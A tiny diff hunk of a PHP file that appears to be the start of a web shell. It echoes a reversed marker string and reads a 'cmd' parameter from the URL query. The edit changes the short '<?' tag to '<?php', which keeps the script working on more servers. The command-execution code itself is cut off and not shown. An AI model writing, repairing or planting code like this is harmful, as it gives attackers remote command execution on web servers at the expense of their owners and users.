@@ -1,4 +1,4 @@
-<?
+<?php
 echo strrev("15825b40c6dace2a");
 if ( isset( $_GET['cmd']) && $_GET['cmd'] !== '' ){
  $ar = array(); $ou = "";
